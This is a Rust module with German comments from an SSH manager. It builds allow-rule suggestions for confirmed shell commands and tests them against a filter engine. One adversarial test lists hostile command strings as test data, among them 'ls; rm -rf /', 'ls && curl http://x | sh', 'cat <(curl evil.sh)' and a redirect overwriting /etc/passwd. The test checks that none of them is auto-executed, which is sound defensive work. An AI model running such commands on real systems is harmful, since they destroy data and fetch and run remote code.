//! Regel-Schnellvorschlag im Bestätigungsdialog (Spec 0011) — reine,
//! testbare Logik; die `#[tauri::command]`-Wrapper in `app_shell::commands`
//! bleiben dünn, analog zu `crate::groups`/`crate::filter_rules`.

use persistence_sqlite::SqlitePolicyStore;
use ssh_manager_core::filter::{
    allow_rule_matches_segment, is_elevation_or_passthrough_wrapper, split_top_level_segments,
    RuleAction, RuleId, Scope,
};

use crate::dto::{
    PatternSuggestionDto, PatternType, RuleInput, SuggestionKind, SuggestionPatternDto,
};
use crate::filter_rules::RuleWriteError;

/// Programme mit Optionen vor dem Unterkommando (Spec 0011, Abschnitt 2):
/// `(Programm, Optionen mit Wert, Optionen ohne Wert)`.
const GLOBAL_OPTIONS: &[(&str, &[&str], &[&str])] = &[
    (
        "git",
        &["-C", "-c", "--git-dir", "--work-tree"],
        &["--no-pager", "--paginate", "--no-optional-locks"],
    ),
    (
        "docker",
        &["--context", "-H", "--host", "--config"],
        &["-D", "--debug"],
    ),
    (
        "kubectl",
        &[
            "-n",
            "--namespace",
            "--context",
            "--kubeconfig",
            "-s",
            "--server",
        ],
        &[],
    ),
    ("systemctl", &[], &["--user", "--system", "--no-pager"]),
];

/// Nur solche Wörter fließen in ein Glob-Muster ein. Alles mit Quotes,
/// Glob-Metazeichen, `$`, Klammern usw. fällt weg — ein solches Wort
/// würde als Muster etwas anderes bedeuten, als der Nutzer bestätigt hat.
fn is_plain_word(word: &str) -> bool {
    !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./:=@,+%".contains(c))
}

fn exact(value: impl Into<String>) -> SuggestionPatternDto {
    SuggestionPatternDto {
        pattern_type: PatternType::Exact,
        pattern_value: value.into(),
    }
}

fn glob(value: impl Into<String>) -> SuggestionPatternDto {
    SuggestionPatternDto {
        pattern_type: PatternType::Glob,
        pattern_value: value.into(),
    }
}

/// Was sich für ein Teilkommando vorschlagen lässt.
struct SegmentPatterns {
    exact: SuggestionPatternDto,
    /// `(Name, Muster)`: Unterkommando (mit Argumenten und ohne).
    sub: Option<(String, Vec<SuggestionPatternDto>)>,
    /// `(Name, Muster)`: alle Aufrufe des Programms.
    tool: Option<(String, SuggestionPatternDto)>,
}

fn analyze_segment(segment: &str) -> SegmentPatterns {
    let tokens: Vec<&str> = segment.split_whitespace().collect();
    let exact_pattern = exact(tokens.join(" "));
    let none = || SegmentPatterns {
        exact: exact_pattern.clone(),
        sub: None,
        tool: None,
    };

    // `sudo`/`doas` fallen beim Abgleich weg (ADR 0002); die Muster
    // beginnen deshalb beim eigentlichen Programm. Andere Wrapper (`env`,
    // Variablenzuweisungen) und Elevation mit Optionen gleicht eine
    // Allow-Regel nicht auf das Programm ab: nur Exakt.
    let mut start = 0;
    if matches!(tokens.first().copied(), Some("sudo" | "doas")) {
        start = 1;
    }
    let Some(&tool) = tokens.get(start) else {
        return none();
    };
    if tool.starts_with('-')
        || tool.contains('=')
        || is_elevation_or_passthrough_wrapper(tool)
        || !is_plain_word(tool)
    {
        return none();
    }

    let rest = &tokens[start + 1..];
    let tool_pattern = if rest.is_empty() {
        exact(tool)
    } else {
        glob(format!("{tool} *"))
    };

    // Optionen vor dem Unterkommando überspringen (nur bekannte Programme).
    let mut prefix = vec![tool];
    let mut i = 0;
    if let Some((_, with_value, flags)) = GLOBAL_OPTIONS.iter().find(|(name, _, _)| *name == tool) {
        while let Some(&opt) = rest.get(i) {
            if flags.contains(&opt) && is_plain_word(opt) {
                prefix.push(opt);
                i += 1;
            } else if with_value.contains(&opt) {
                match rest.get(i + 1) {
                    Some(&value) if is_plain_word(value) => {
                        prefix.push(opt);
                        prefix.push(value);
                        i += 2;
                    }
                    _ => break,
                }
            } else if opt.starts_with("--")
                && opt
                    .split_once('=')
                    .is_some_and(|(name, _)| with_value.contains(&name))
                && is_plain_word(opt)
            {
                prefix.push(opt);
                i += 1;
            } else {
                break;
            }
        }
    }
    let sub = rest
        .get(i)
        .copied()
        .filter(|word| !word.starts_with('-') && is_plain_word(word))
        .map(|word| {
            let base = format!("{} {word}", prefix.join(" "));
            (
                format!("{tool} {word}"),
                vec![exact(base.clone()), glob(format!("{base} *"))],
            )
        });

    SegmentPatterns {
        exact: exact_pattern,
        sub,
        tool: Some((tool.to_string(), tool_pattern)),
    }
}

fn push_unique<T: PartialEq>(list: &mut Vec<T>, item: T) {
    if !list.contains(&item) {
        list.push(item);
    }
}

/// Ob die Muster des Vorschlags jedes Teilkommando so abdecken, wie die
/// Engine eine Allow-Regel abgleicht, und sich übersetzen lassen
/// (Spec 0077, 3.1.5). Ein Vorschlag, der das bestätigte Kommando nicht
/// träfe, würde nichts bewirken — er wird weggelassen, nicht repariert.
fn suggestion_covers(suggestion: &PatternSuggestionDto, segments: &[String]) -> bool {
    let patterns: Vec<_> = suggestion
        .patterns
        .iter()
        .map(|p| crate::dto::pattern_from_parts(p.pattern_type, p.pattern_value.clone()))
        .collect();
    patterns.iter().all(|p| p.validate().is_ok())
        && segments.iter().all(|segment| {
            patterns
                .iter()
                .any(|p| allow_rule_matches_segment(p, segment))
        })
}

/// Spec 0011, Abschnitt 2: Vorschläge für ein bestätigtes Kommando, vom
/// Spezifischen zum Allgemeinen, höchstens [`MAX_SUGGESTIONS`]. Die
/// Zerlegung in Teilkommandos nutzt den Parser der Filter-Engine; jeder
/// Vorschlag wird gegen den Abgleich der Engine geprüft (er muss das
/// bestätigte Kommando treffen). Kann das Kommando nicht sicher zerlegt
/// werden, gibt es nur den Exakt-Vorschlag.
pub fn suggest_rule_patterns(command: &str) -> Vec<PatternSuggestionDto> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Vec::new();
    }
    let Some(raw_segments) = split_top_level_segments(trimmed) else {
        let suggestion = PatternSuggestionDto {
            kind: SuggestionKind::Exact,
            names: Vec::new(),
            patterns: vec![exact(trimmed)],
        };
        return if suggestion_covers(&suggestion, &[trimmed.to_string()]) {
            vec![suggestion]
        } else {
            Vec::new()
        };
    };
    let mut segments: Vec<String> = Vec::new();
    for segment in raw_segments {
        push_unique(&mut segments, segment);
    }
    let analyzed: Vec<SegmentPatterns> = segments.iter().map(|s| analyze_segment(s)).collect();

    let mut candidates = Vec::new();

    // 1. Exakt (je Teilkommando).
    let mut patterns = Vec::new();
    for a in &analyzed {
        push_unique(&mut patterns, a.exact.clone());
    }
    candidates.push(PatternSuggestionDto {
        kind: if segments.len() > 1 {
            SuggestionKind::ExactPerSegment
        } else {
            SuggestionKind::Exact
        },
        names: Vec::new(),
        patterns,
    });

    // 2. Unterkommando (Teilkommandos ohne Unterkommando: Programm bzw. exakt).
    if analyzed.iter().any(|a| a.sub.is_some()) {
        let (mut names, mut patterns) = (Vec::new(), Vec::new());
        for a in &analyzed {
            if let Some((name, pats)) = &a.sub {
                push_unique(&mut names, name.clone());
                for p in pats {
                    push_unique(&mut patterns, p.clone());
                }
            } else if let Some((name, pat)) = &a.tool {
                push_unique(&mut names, name.clone());
                push_unique(&mut patterns, pat.clone());
            } else {
                push_unique(&mut patterns, a.exact.clone());
            }
        }
        candidates.push(PatternSuggestionDto {
            kind: SuggestionKind::Subcommand,
            names,
            patterns,
        });
    }

    // 3. Alle Aufrufe des Programms.
    if analyzed.iter().any(|a| a.tool.is_some()) {
        let (mut names, mut patterns) = (Vec::new(), Vec::new());
        for a in &analyzed {
            if let Some((name, pat)) = &a.tool {
                push_unique(&mut names, name.clone());
                push_unique(&mut patterns, pat.clone());
            } else {
                push_unique(&mut patterns, a.exact.clone());
            }
        }
        candidates.push(PatternSuggestionDto {
            kind: SuggestionKind::Tool,
            names,
            patterns,
        });
    }

    let mut suggestions: Vec<PatternSuggestionDto> = Vec::new();
    for candidate in candidates {
        if !suggestion_covers(&candidate, &segments) {
            continue;
        }
        let same_set = |other: &PatternSuggestionDto| {
            other.patterns.len() == candidate.patterns.len()
                && other
                    .patterns
                    .iter()
                    .all(|p| candidate.patterns.contains(p))
        };
        if !suggestions.iter().any(same_set) {
            suggestions.push(candidate);
        }
    }
    suggestions.truncate(MAX_SUGGESTIONS);
    suggestions
}

/// Spec 0011, Abschnitt 2: höchstens sechs Vorschläge.
pub const MAX_SUGGESTIONS: usize = 6;

/// Spec 0011, Abschnitt 3, Schritt 1: legt die Regel mit fest `RuleAction::Allow`
/// an (s. Abschnitt 5, "Offene Punkte" — Confirm als Regel-Aktion böte hier
/// keinen Mehrwert gegenüber dem bestehenden Default-Fallback) und
/// `priority` Default `0`, falls nicht angegeben (die Schnellvorschlag-UI
/// bietet laut Abschnitt 4 kein eigenes Prioritäts-Feld an). Reine
/// Delegation an [`crate::filter_rules::create_rule`] (Spec 0009) — keine
/// eigene Anlege-Logik.
///
/// Spec 0077, 3.1.2/3.1.3: Übernimmt damit auch die Prüfung aus Schicht 1
/// und denselben Fehlertyp — ein ungültiges Muster wird hier genauso
/// abgewiesen wie im Formular.
pub async fn create_quick_rule(
    policy_store: &SqlitePolicyStore,
    pattern_type: PatternType,
    pattern_value: String,
    scope: Scope,
    priority: Option<i32>,
) -> Result<RuleId, RuleWriteError> {
    let input = RuleInput {
        pattern_type,
        pattern_value,
        action: RuleAction::Allow,
        scope,
        priority: priority.unwrap_or(0),
    };
    crate::filter_rules::create_rule(policy_store, input).await
}

/// Wie [`create_quick_rule`] für mehrere Muster (Spec 0011, Abschnitt 3):
/// alle Regeln mit demselben Geltungsbereich, **atomar** — ist ein Muster
/// ungültig oder scheitert das Schreiben, wird keine gespeichert.
pub async fn create_quick_rules(
    policy_store: &SqlitePolicyStore,
    patterns: Vec<SuggestionPatternDto>,
    scope: Scope,
    priority: Option<i32>,
) -> Result<Vec<RuleId>, RuleWriteError> {
    let now = chrono::Utc::now();
    let stored: Vec<_> = patterns
        .into_iter()
        .map(|p| {
            RuleInput {
                pattern_type: p.pattern_type,
                pattern_value: p.pattern_value,
                action: RuleAction::Allow,
                scope: scope.clone(),
                priority: priority.unwrap_or(0),
            }
            .into_stored_rule(RuleId(uuid::Uuid::new_v4().to_string()), now, now)
        })
        .collect();
    for rule in &stored {
        rule.pattern.validate()?;
    }
    policy_store.create_many(&stored).await?;
    Ok(stored.into_iter().map(|r| r.id).collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn labels_and_patterns(command: &str) -> Vec<(PatternType, String)> {
        suggest_rule_patterns(command)
            .into_iter()
            .flat_map(|s| s.patterns)
            .map(|p| (p.pattern_type, p.pattern_value))
            .collect()
    }

    // --- Spec 0077: Vorschläge und Schnellregel ---------------------------

    /// Spec 0077, T-6b (3.1.5): Für `ls [abc def` entstünde aus dem ersten
    /// Token der Glob `ls *` (gültig) und aus den ersten beiden
    /// `ls [abc *` — und der übersetzt nicht. Der unbrauchbare Vorschlag
    /// wird weggelassen, die brauchbaren bleiben.
    ///
    /// Scheitert, wenn Vorschläge ungeprüft angeboten werden: Dann stünde
    /// dem Nutzer ein Vorschlag zur Auswahl, den Schicht 1 anschließend
    /// abweist.
    #[test]
    fn test_spec_0077_t6b_suggestions_never_offer_a_pattern_that_does_not_compile() {
        let result = labels_and_patterns("ls [abc def");

        for (pattern_type, pattern_value) in &result {
            let pattern = crate::dto::pattern_from_parts(*pattern_type, pattern_value.clone());
            assert!(
                pattern.validate().is_ok(),
                "unbrauchbarer Vorschlag angeboten: {pattern_value:?}"
            );
        }
        assert!(
            !result.iter().any(|(_, value)| value == "ls [abc *"),
            "der nicht übersetzende Vorschlag muss wegfallen: {result:?}"
        );
        // Die brauchbaren Vorschläge bleiben erhalten — 3.1.5 lässt sie
        // weg, verändert sie nicht und wirft nicht alle weg.
        assert!(
            result.contains(&(PatternType::Exact, "ls [abc def".to_string())),
            "der Exakt-Vorschlag ist gültig und muss bleiben: {result:?}"
        );
        assert!(
            result.contains(&(PatternType::Glob, "ls *".to_string())),
            "der Basis-Wildcard ist gültig und muss bleiben: {result:?}"
        );
    }

    /// Spec 0077, T-6a: Die Schnellregel läuft über
    /// `filter_rules::create_rule` und wird damit von Schicht 1 gedeckt —
    /// ein ungültiger Glob wird abgewiesen, nichts wird gespeichert.
    #[tokio::test]
    async fn test_spec_0077_t6a_quick_rule_rejects_an_invalid_glob_and_stores_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let store =
            persistence_sqlite::SqliteProfileStore::connect_plaintext(&dir.path().join("test.db"))
                .await
                .unwrap()
                .policy_store();

        let err = create_quick_rule(
            &store,
            PatternType::Glob,
            "ls [abc *".to_string(),
            Scope::Global,
            None,
        )
        .await
        .expect_err("ein Glob, der nicht übersetzt, darf nicht gespeichert werden");

        assert!(
            matches!(err, RuleWriteError::InvalidPattern(_)),
            "InvalidPattern erwartet, bekommen: {err:?}"
        );
        assert!(
            store.list_all().await.unwrap().is_empty(),
            "die Schnellregel darf nichts angelegt haben"
        );
    }

    // --- Spec 0011: Vorschläge gegen die echte Engine ----------------------

    use ssh_manager_core::filter::{Decision, EvalContext, FilterEngine};

    async fn new_store() -> (tempfile::TempDir, SqlitePolicyStore) {
        let dir = tempfile::tempdir().unwrap();
        let store =
            persistence_sqlite::SqliteProfileStore::connect_plaintext(&dir.path().join("t.db"))
                .await
                .unwrap()
                .policy_store();
        (dir, store)
    }

    fn ctx() -> EvalContext {
        EvalContext {
            server_id: ssh_manager_core::shared::ServerId::new(),
            tags: Vec::new(),
        }
    }

    /// Legt `suggestion` an und wertet `command` mit der echten Engine aus.
    async fn decision_with(suggestion: &PatternSuggestionDto, command: &str) -> Decision {
        let (_dir, store) = new_store().await;
        create_quick_rules(&store, suggestion.patterns.clone(), Scope::Global, None)
            .await
            .unwrap();
        FilterEngine::new(store).evaluate(command, &ctx()).await
    }

    fn by_kind(command: &str, kind: SuggestionKind) -> PatternSuggestionDto {
        suggest_rule_patterns(command)
            .into_iter()
            .find(|s| s.kind == kind)
            .unwrap_or_else(|| panic!("kein {kind:?}-Vorschlag für {command:?}"))
    }

    fn values(s: &PatternSuggestionDto) -> Vec<&str> {
        s.patterns
            .iter()
            .map(|p| p.pattern_value.as_str())
            .collect()
    }

    #[tokio::test]
    async fn test_pipeline_per_segment_rules_auto_accept_the_whole_line() {
        let command = "ps aux | grep java";
        let s = by_kind(command, SuggestionKind::ExactPerSegment);
        assert_eq!(values(&s), ["ps aux", "grep java"]);
        assert_eq!(decision_with(&s, command).await, Decision::AutoExec);
        // Gegenprobe: ohne Regeln bleibt es bei Confirm.
        let (_d, store) = new_store().await;
        assert!(matches!(
            FilterEngine::new(store).evaluate(command, &ctx()).await,
            Decision::Confirm { .. }
        ));
        // Das alte Ganzzeilen-Exakt hätte nie gegriffen.
        let (_d, store) = new_store().await;
        create_quick_rule(
            &store,
            PatternType::Exact,
            command.into(),
            Scope::Global,
            None,
        )
        .await
        .unwrap();
        assert!(matches!(
            FilterEngine::new(store).evaluate(command, &ctx()).await,
            Decision::Confirm { .. }
        ));
    }

    #[tokio::test]
    async fn test_bare_subcommand_is_matched_with_and_without_arguments() {
        let s = by_kind("systemctl status nginx", SuggestionKind::Subcommand);
        assert_eq!(values(&s), ["systemctl status", "systemctl status *"]);
        for cmd in ["systemctl status", "systemctl status nginx"] {
            assert_eq!(decision_with(&s, cmd).await, Decision::AutoExec, "{cmd}");
        }
        assert!(matches!(
            decision_with(&s, "systemctl stop nginx").await,
            Decision::Confirm { .. }
        ));
    }

    #[tokio::test]
    async fn test_git_global_option_is_skipped_but_pinned_and_other_subcommands_stay_confirmed() {
        let command = "git -C /srv/app pull";
        let s = by_kind(command, SuggestionKind::Subcommand);
        assert_eq!(s.names, ["git pull"]);
        for cmd in [command, "git -C /srv/app pull --rebase"] {
            assert_eq!(decision_with(&s, cmd).await, Decision::AutoExec, "{cmd}");
        }
        for cmd in [
            "git -C /srv/app push",
            "git -C /srv/app reset --hard",
            "git -C /other pull",
            "git push pull",
            "git pull",
        ] {
            assert!(
                !matches!(decision_with(&s, cmd).await, Decision::AutoExec),
                "{cmd}"
            );
        }
    }

    #[test]
    fn test_global_option_tools() {
        for (cmd, expected) in [
            ("docker --context prod ps -a", "docker --context prod ps"),
            ("docker -H tcp://h:2375 ps", "docker -H tcp://h:2375 ps"),
            ("kubectl -n web get pods", "kubectl -n web get"),
            ("kubectl --context c get pods", "kubectl --context c get"),
            ("systemctl --user restart x", "systemctl --user restart"),
            ("git -c core.x=1 log", "git -c core.x=1 log"),
        ] {
            let s = by_kind(cmd, SuggestionKind::Subcommand);
            assert_eq!(values(&s)[0], expected, "{cmd}");
        }
    }

    #[tokio::test]
    async fn test_sudo_command_offers_no_redundant_sudo_pattern_and_tool_rule_matches_it() {
        let command = "sudo apt update";
        let all = suggest_rule_patterns(command);
        assert!(
            all.iter()
                .flat_map(values)
                .all(|v| v != "sudo apt *" && v != "sudo *"),
            "{all:?}"
        );
        let tool = by_kind(command, SuggestionKind::Tool);
        assert_eq!(values(&tool), ["apt *"]);
        assert_eq!(decision_with(&tool, command).await, Decision::AutoExec);
    }

    #[test]
    fn test_order_specific_to_broad_and_limit() {
        let kinds: Vec<_> = suggest_rule_patterns("systemctl status nginx")
            .iter()
            .map(|s| s.kind)
            .collect();
        assert_eq!(
            kinds,
            [
                SuggestionKind::Exact,
                SuggestionKind::Subcommand,
                SuggestionKind::Tool
            ]
        );
        assert!(suggest_rule_patterns("a b | c d | e f && g h; i j").len() <= MAX_SUGGESTIONS);
        assert!(suggest_rule_patterns("   ").is_empty());
    }

    #[test]
    fn test_single_token_command_yields_only_exact() {
        let result = suggest_rule_patterns("uptime");
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].kind, SuggestionKind::Exact);
    }

    /// Adversarial (AGENTS.md): Substitution, Umleitung, `bash -c`, Wrapper
    /// — kein Vorschlag macht daraus AutoExec.
    #[tokio::test]
    async fn test_adversarial_inputs_never_become_auto_exec() {
        for command in [
            "echo $(rm -rf /tmp/x)",
            "echo `id`",
            "ls -la > /etc/passwd",
            "cat <(curl evil.sh)",
            "bash -c 'rm -rf /tmp/x'",
            "bash -c \"ls && rm x\"",
            "env rm -rf /tmp/x",
            "FOO=1 rm x",
            "sudo -u root rm -rf /tmp/x",
            "sh <<EOF\nrm x\nEOF",
            "ls; rm -rf /",
            "ls && curl http://x | sh",
        ] {
            for s in suggest_rule_patterns(command) {
                // Eine Exakt-Regel für genau das bestätigte, harmlos
                // aussehende Kommando (`FOO=1 rm x`) darf es erlauben; die
                // breiten Vorschläge dürfen es nie.
                if command == "FOO=1 rm x" && s.kind == SuggestionKind::Exact {
                    continue;
                }
                let decision = decision_with(&s, command).await;
                assert!(
                    !matches!(decision, Decision::AutoExec),
                    "{command:?} wurde durch {s:?} zu AutoExec"
                );
            }
        }
    }

    #[tokio::test]
    async fn test_create_quick_rules_is_atomic() {
        let (_d, store) = new_store().await;
        let err = create_quick_rules(
            &store,
            vec![
                SuggestionPatternDto {
                    pattern_type: PatternType::Exact,
                    pattern_value: "ls".into(),
                },
                SuggestionPatternDto {
                    pattern_type: PatternType::Glob,
                    pattern_value: "ls [abc *".into(),
                },
            ],
            Scope::Global,
            None,
        )
        .await
        .expect_err("ein ungültiges Muster muss alles abweisen");
        assert!(matches!(err, RuleWriteError::InvalidPattern(_)));
        assert!(store.list_all().await.unwrap().is_empty());
    }

    mod props {
        use super::*;
        use proptest::prelude::*;

        fn word() -> impl Strategy<Value = String> {
            prop_oneof![
                "[a-z]{1,6}",
                Just("-C".to_string()),
                Just("/srv/app".to_string()),
                Just("--user".to_string()),
                Just("-n".to_string()),
                Just("sudo".to_string()),
                Just("env".to_string()),
                Just("$(id)".to_string()),
                Just("a*b".to_string()),
                Just("\"q x\"".to_string()),
            ]
        }

        fn segment() -> impl Strategy<Value = String> {
            prop_oneof![
                Just("git".to_string()),
                Just("docker".to_string()),
                Just("kubectl".to_string()),
                Just("systemctl".to_string()),
                Just("sudo".to_string()),
                "[a-z]{1,6}",
            ]
            .prop_flat_map(|head| {
                proptest::collection::vec(word(), 0..4)
                    .prop_map(move |w| format!("{head} {}", w.join(" ")).trim().to_string())
            })
        }

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(48))]

            /// Jeder Vorschlag macht das bestätigte Kommando zu AutoExec,
            /// außer eine regelunabhängige Prüfung greift: Dann reicht es,
            /// dass die Engine ohne Regeln dasselbe nicht erlaubt.
            #[test]
            fn every_suggestion_auto_accepts_the_confirmed_command(
                segs in proptest::collection::vec(segment(), 1..4),
                sep in prop_oneof![Just(" | "), Just(" && "), Just("; ")],
            ) {
                let command = segs.join(sep);
                let rt = tokio::runtime::Builder::new_current_thread().enable_all().build().unwrap();
                rt.block_on(async {
                    let (_d, empty) = new_store().await;
                    let baseline = FilterEngine::new(empty).evaluate(&command, &ctx()).await;
                    let suggestions = suggest_rule_patterns(&command);
                    prop_assert!(suggestions.len() <= MAX_SUGGESTIONS);
                    for s in suggestions {
                        let d = decision_with(&s, &command).await;
                        if matches!(d, Decision::AutoExec) {
                            continue;
                        }
                        // Nur eine regelunabhängige Prüfung darf verhindern.
                        let (_d, store) = new_store().await;
                        create_quick_rules(&store, vec![SuggestionPatternDto{pattern_type: PatternType::Glob, pattern_value: "*".into()}], Scope::Global, None).await.unwrap();
                        let with_catch_all = FilterEngine::new(store).evaluate(&command, &ctx()).await;
                        prop_assert!(
                            !matches!(with_catch_all, Decision::AutoExec),
                            "{command:?} / {s:?}: {d:?} (ohne Regeln {baseline:?})"
                        );
                    }
                    Ok(())
                })?;
            }
        }
    }

    #[tokio::test]
    async fn test_create_quick_rule_defaults_priority_and_uses_allow_action() {
        let dir = tempfile::tempdir().expect("Temp-Verzeichnis sollte anlegbar sein");
        let db_path = dir.path().join("test.db");
        let store = persistence_sqlite::SqliteProfileStore::connect_plaintext(&db_path)
            .await
            .expect(
                "frische SQLite-Datenbank mit angewendeten Migrationen sollte immer aufbaubar sein",
            )
            .policy_store();

        let rule_id = create_quick_rule(
            &store,
            PatternType::Glob,
            "systemctl *".to_string(),
            Scope::Global,
            None,
        )
        .await
        .unwrap();

        let stored = store.get(&rule_id).await.unwrap();
        assert_eq!(stored.action, RuleAction::Allow);
        assert_eq!(stored.priority, 0);
        assert_eq!(stored.scope, Scope::Global);
    }
}
